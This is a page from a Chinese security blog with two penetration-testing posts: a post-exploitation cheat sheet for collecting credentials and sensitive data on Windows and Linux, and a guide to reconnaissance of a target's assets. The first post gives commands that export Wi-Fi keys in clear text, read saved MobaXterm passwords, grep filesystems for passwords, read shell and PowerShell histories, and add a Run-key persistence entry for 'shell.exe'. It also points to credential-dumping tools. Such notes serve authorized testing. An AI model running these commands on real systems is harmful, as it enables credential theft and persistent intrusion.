<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.5.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="Always good to see">
<meta property="og:type" content="website">
<meta property="og:title" content="aplyc1a&#39;s blogs">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="aplyc1a&#39;s blogs">
<meta property="og:description" content="Always good to see">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="aplyc1a">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>aplyc1a's blogs</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">aplyc1a's blogs</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">aplyc1a</p>
  <div class="site-description" itemprop="description">Always good to see</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



          </div>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E4%B8%BB%E6%9C%BA%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/21/%E4%B8%BB%E6%9C%BA%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">后渗透-主机敏感数据搜集</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-21 20:12:00 / Modified: 23:09:30" itemprop="dateCreated datePublished" datetime="2021-06-21T20:12:00-08:00">2021-06-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-文件目录操作"><a href="#0x00-文件目录操作" class="headerlink" title="0x00 文件目录操作"></a>0x00 文件目录操作</h2><h3 id="1-查找文件"><a href="#1-查找文件" class="headerlink" title="1.查找文件"></a>1.查找文件</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r 目录名 %变量名 <span class="keyword">in</span> (匹配模式<span class="number">1</span>,匹配模式<span class="number">2</span>) <span class="keyword">do</span> 命令</span><br><span class="line"><span class="keyword">for</span> /r d: %i <span class="keyword">in</span> (*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r d: %i <span class="keyword">in</span> (*.txt,*.jpg) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r d: %i <span class="keyword">in</span> (*shell.jsp) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>

<h3 id="2-查看文件内容"><a href="#2-查看文件内容" class="headerlink" title="2.查看文件内容"></a>2.查看文件内容</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> &quot;D:\www\shell.jsp&quot;</span><br></pre></td></tr></table></figure>

<p>powershell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> <span class="string">&quot;D:\www\shell.jsp&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-删除文件"><a href="#3-删除文件" class="headerlink" title="3.删除文件"></a>3.删除文件</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#删文件</span><br><span class="line"><span class="built_in">del</span> index.js</span><br><span class="line">#删文件夹</span><br><span class="line"><span class="built_in">rd</span> app</span><br></pre></td></tr></table></figure>

<p>powershell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">remove-item</span> w.ps1 <span class="literal">-Force</span> <span class="literal">-Recurse</span></span><br></pre></td></tr></table></figure>

<h3 id="4-查看目录"><a href="#4-查看目录" class="headerlink" title="4.查看目录"></a>4.查看目录</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#下载目录</span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%username%</span>\Downloads</span><br><span class="line">#桌面</span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%username%</span>\Desktop</span><br><span class="line">#微信</span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%username%</span>\Documents\WeChat Files\wx*\FileStorage\File\</span><br><span class="line">#磁盘盘符数</span><br><span class="line">powershell -Command &quot;[Environment]::GetLogicalDrives()&quot;</span><br></pre></td></tr></table></figure>



<h2 id="0x01-注册表"><a href="#0x01-注册表" class="headerlink" title="0x01 注册表"></a>0x01 注册表</h2><h3 id="1-常见注册表项"><a href="#1-常见注册表项" class="headerlink" title="1.常见注册表项"></a>1.常见注册表项</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#启动项</span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">#账户</span><br><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse</span><br><span class="line">#网口配置文件</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\</span><br><span class="line">#隐藏文件置<span class="number">0</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL</span><br><span class="line">#网络连接历史</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged</span><br></pre></td></tr></table></figure>
<h3 id="2-查看"><a href="#2-查看" class="headerlink" title="2.查看"></a>2.查看</h3><p>cmd:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse</span><br></pre></td></tr></table></figure>
<p>powershell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span>=<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion&quot;</span></span><br><span class="line"><span class="variable">$key</span>``.CommonFilesDir</span><br></pre></td></tr></table></figure>

<h3 id="3-添加"><a href="#3-添加" class="headerlink" title="3.添加"></a>3.添加</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Users\Administrator\Desktop\shell.exe&quot; /f </span><br></pre></td></tr></table></figure>

<h3 id="4-导出"><a href="#4-导出" class="headerlink" title="4.导出"></a>4.导出</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa AppBkUp.reg</span><br></pre></td></tr></table></figure>

<h2 id="0x02-密码收集"><a href="#0x02-密码收集" class="headerlink" title="0x02 密码收集"></a>0x02 密码收集</h2><h3 id="1-企业域内账号凭据"><a href="#1-企业域内账号凭据" class="headerlink" title="1 企业域内账号凭据"></a>1 企业域内账号凭据</h3><p>1&gt; C:/User/账户名/pip/pip.ini</p>
<p>pip.ini 内网中可能还有http代理信息，代理信息中可能含有账户名及密码。</p>
<p>2&gt;</p>
<h3 id="2-无线密码"><a href="#2-无线密码" class="headerlink" title="2 无线密码"></a>2 无线密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行下面命令，密码导出在生成的xml文件中</span></span><br><span class="line">netsh WLAN export profile key=<span class="built_in">clear</span> folder=.</span><br></pre></td></tr></table></figure>

<h3 id="3-mobaxterm"><a href="#3-mobaxterm" class="headerlink" title="3 mobaxterm"></a>3 mobaxterm</h3><p>对于安装版的moba，可以通过读取注册表，得到明文密码。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\P</span><br></pre></td></tr></table></figure>

<p>更多：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yang34/p/14236230.html">https://www.cnblogs.com/yang34/p/14236230.html</a></p>
<h3 id="4-XShell"><a href="#4-XShell" class="headerlink" title="4 XShell"></a>4 XShell</h3><p><a target="_blank" rel="noopener" href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p>
<h3 id="5-浏览器"><a href="#5-浏览器" class="headerlink" title="5 浏览器"></a>5 浏览器</h3><p>提供以下两种方法：</p>
<p><strong>5.1 工具</strong>：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne/releases">https://github.com/AlessandroZ/LaZagne/releases</a></p>
<p><strong>5.2 可操作桌面时</strong>：</p>
<p>火狐-&gt;打开菜单-&gt;我的密码</p>
<p>Chrome-&gt;设置-&gt;自动填充-&gt;密码</p>
<h3 id="6-数据库密码"><a href="#6-数据库密码" class="headerlink" title="6 数据库密码"></a>6 数据库密码</h3><p>本地web目录下找配置目录中的配置文件</p>
<h3 id="x-to-be-continue"><a href="#x-to-be-continue" class="headerlink" title="[x] to be continue"></a>[x] to be continue</h3><p>filezilla/teamviewer/vnc/系统哈希/navicat</p>
<h2 id="0x03-敏感数据发现"><a href="#0x03-敏感数据发现" class="headerlink" title="0x03 敏感数据发现"></a>0x03 敏感数据发现</h2><h3 id="1-回收站分析"><a href="#1-回收站分析" class="headerlink" title="1 回收站分析"></a>1 回收站分析</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /f <span class="string">&quot;skip=1 tokens=1,2 delims= &quot;</span> %c <span class="keyword">in</span> (<span class="string">&#x27;wmic useraccount get name,sid&#x27;</span>) <span class="keyword">do</span> <span class="built_in">dir</span> /a /b C:\<span class="variable">$Recycle</span>.Bin\%d\ &gt;%c.txt</span><br><span class="line">PowerShell <span class="literal">-Command</span>  <span class="string">&quot;<span class="variable">$Recycler</span> =(New-Object -ComObject Shell.Application).NameSpace(0xa);foreach(<span class="variable">$file</span> in <span class="variable">$Recycler</span>.items())&#123;echo &quot;</span>---------------------<span class="string">&quot;;<span class="variable">$file</span>.path;<span class="variable">$file</span>.ExtendedProperty(\&quot;</span>&#123;<span class="number">9</span>B174B33<span class="literal">-40FF</span><span class="literal">-11D2</span><span class="literal">-A27E</span><span class="literal">-00C04FC30871</span>&#125; <span class="number">2</span>\<span class="string">&quot;)+&#x27;\&#x27;+<span class="variable">$file</span>.name&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-常见目录"><a href="#2-常见目录" class="headerlink" title="2 常见目录"></a>2 常见目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 桌面</span></span><br><span class="line">C:\Users\%username%\Desktop</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载目录</span></span><br><span class="line">C:\Users\%username%\Downloads</span><br><span class="line"><span class="meta">#</span><span class="bash"> 微信下载目录</span></span><br><span class="line">C:\Users\%username%\Documents\WeChat Files\微信号\FileStorage\File\归档日期</span><br></pre></td></tr></table></figure>

<h3 id="3-VMware"><a href="#3-VMware" class="headerlink" title="3 VMware"></a>3 VMware</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">一些传送的文件</span></span><br><span class="line">C:\Users\%username%\AppData\Local\Temp\vmware-%username%\VMwareDnD</span><br><span class="line"><span class="meta">#</span><span class="bash">每台vmware的<span class="built_in">log</span>日志都含有启动操作信息。</span></span><br><span class="line">C:\Users\%username%\AppData\Local\Temp\vmware-%username%\</span><br><span class="line"><span class="meta">#</span><span class="bash">vmware内主机的备注信息</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-历史记录"><a href="#0x04-历史记录" class="headerlink" title="0x04 历史记录"></a>0x04 历史记录</h2><h3 id="1-Git-Bash历史记录"><a href="#1-Git-Bash历史记录" class="headerlink" title="1 Git-Bash历史记录:"></a>1 Git-Bash历史记录:</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\%<span class="title">username</span>%\.<span class="title">bash_history</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\%<span class="title">username</span>%\.<span class="title">gitconfig</span></span></span><br></pre></td></tr></table></figure>

<h3 id="2-运行框历史记录"><a href="#2-运行框历史记录" class="headerlink" title="2 运行框历史记录"></a>2 运行框历史记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br><span class="line">reg query HKEY_USERS\&lt;sid&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</span><br></pre></td></tr></table></figure>

<h3 id="3-powershell历史记录"><a href="#3-powershell历史记录" class="headerlink" title="3 powershell历史记录"></a>3 powershell历史记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content (Get-PSReadLineOption).HistorySavePath</span><br></pre></td></tr></table></figure>

<h3 id="4-DNS缓存记录"><a href="#4-DNS缓存记录" class="headerlink" title="4 DNS缓存记录"></a>4 DNS缓存记录</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /displaydns</span><br></pre></td></tr></table></figure>



<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="0x00-历史记录"><a href="#0x00-历史记录" class="headerlink" title="0x00 历史记录"></a>0x00 历史记录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /root/ 及 /home/*/</span></span><br><span class="line">.bash_history</span><br><span class="line">.zsh_history</span><br><span class="line">.mysql_history</span><br></pre></td></tr></table></figure>

<h2 id="0x01-各类凭据"><a href="#0x01-各类凭据" class="headerlink" title="0x01 各类凭据"></a>0x01 各类凭据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> web服务类</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -- 定位到服务目录下的配置目录。查看配置文件中的数据库口令</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 登录用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 结合 <span class="built_in">history</span>|grep ssh 及~/.ssh/authorized_keys拿到其他设备的登录权限。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> redis</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> -- 定位配置文件中的requirepass</span></span><br><span class="line">find / -name redis.conf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 密码搜集</span></span><br><span class="line">grep -rn &quot;pass&quot; -a / | grep -v &quot;php\|jsp\|\.js\|\|.java&quot;</span><br><span class="line">find / -name *.properties -o -name *.xml -o -name *.conf -o -name *.json -exec grep -Hn &quot;passw&quot; &#123;&#125; \;</span><br></pre></td></tr></table></figure>



<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*MySQL数据库内找密码*/</span><br><span class="line">SELECT TABLE_NAME FROM `information_schema`.`COLUMNS` where `COLUMN_NAME` like &#x27;%pass%&#x27;;</span><br><span class="line">SELECT TABLE_NAME FROM `information_schema`.`COLUMNS` where `COLUMN_NAME` like &#x27;%pwd%&#x27;;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/21/%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">渗透测试-资产信息收集</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-21 20:12:00 / Modified: 23:09:09" itemprop="dateCreated datePublished" datetime="2021-06-21T20:12:00-08:00">2021-06-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01-渗透测试-资产信息收集"><a href="#0x01-渗透测试-资产信息收集" class="headerlink" title="0x01 渗透测试-资产信息收集"></a>0x01 渗透测试-资产信息收集</h2><h3 id="1-目标单位清单信息收集"><a href="#1-目标单位清单信息收集" class="headerlink" title="1 目标单位清单信息收集"></a>1 目标单位清单信息收集</h3><h4 id="1-1-通用搜索引擎查询"><a href="#1-1-通用搜索引擎查询" class="headerlink" title="1.1 通用搜索引擎查询"></a>1.1 通用搜索引擎查询</h4><p>搜索企业关键字。如果搜索引擎支持语法查询，可以使用语法快速过滤结果（参考google hacking）。</p>
<p>得到的结果往往不全，需要结合其他方式进行扩展与补充。</p>
<h4 id="1-2-网络安全搜索引擎"><a href="#1-2-网络安全搜索引擎" class="headerlink" title="1.2 网络安全搜索引擎"></a>1.2 网络安全搜索引擎</h4><p>使用网络安全搜索引擎的语法查询过滤出目标单位相关的资产。不同的网络安全搜索引擎有不同的侧重点。前4种对国内覆盖比较全，最后1种是针对全网的神器。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>官网</th>
</tr>
</thead>
<tbody><tr>
<td>fofa</td>
<td><a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></td>
</tr>
<tr>
<td>censys</td>
<td><a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a></td>
</tr>
<tr>
<td>quark</td>
<td><a target="_blank" rel="noopener" href="https://quake.360.cn/quake/welcome">https://quake.360.cn/quake/welcome</a></td>
</tr>
<tr>
<td>zoomeye</td>
<td><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
</tr>
<tr>
<td>shodan</td>
<td><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></td>
</tr>
</tbody></table>
<p>前两个比较好用，也写了API查询脚本，附在toolkits仓库中，但是从实际使用情况来看，这类搜索引擎的结果中往往含有大量误报。</p>
<h4 id="1-3-企业注册信息查询"><a href="#1-3-企业注册信息查询" class="headerlink" title="1.3 企业注册信息查询"></a>1.3 企业注册信息查询</h4><p>可以使用企查查、爱企查、天眼查，搜索企业注册信息。重点关注股权结构下企业名下控股的其他子公司。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>官网</th>
</tr>
</thead>
<tbody><tr>
<td>企查查</td>
<td><a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a></td>
</tr>
<tr>
<td>爱企查</td>
<td><a target="_blank" rel="noopener" href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
</tr>
<tr>
<td>天眼查</td>
<td><a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td>
</tr>
</tbody></table>
<p><strong>1.4 工信部备案信息查询</strong></p>
<p>查询企业名下的所有注册域名信息，但是要求必须提供企业的标准名称全称，不支持模糊搜索。</p>
<p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></p>
<h3 id="2-IP资产梳理"><a href="#2-IP资产梳理" class="headerlink" title="2 IP资产梳理"></a>2 IP资产梳理</h3><h4 id="2-1-IP正则"><a href="#2-1-IP正则" class="headerlink" title="2.1 IP正则"></a>2.1 IP正则</h4><p>顾名思义，用于匹配字符串中的IP。</p>
<p>C语言：（IP及端口）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP_REGX <span class="meta-string">&quot;((25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;|[1-9]?[0-9])\\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|1[0-9]&#123;2&#125;|[1-9]?[0-9])&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT_REGX <span class="meta-string">&quot;(:[1-5][0-9]&#123;4&#125;/)|(:6[0-4][0-9]&#123;3&#125;/)|(:65[0-4][0-9]&#123;2&#125;/)|(:655[0-2][0-9]&#123;1&#125;/)|(:6553[0-5]/)|(:[1-9][0-9]&#123;0,3&#125;/)&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>Python：（IP）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall(<span class="string">r&quot;\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b&quot;</span>, string_ip)</span><br></pre></td></tr></table></figure>



<h4 id="2-2-IP转C段"><a href="#2-2-IP转C段" class="headerlink" title="2.2 IP转C段"></a>2.2 IP转C段</h4><p>用于将各种类型的IP段统一处理成单IP清单形式。</p>
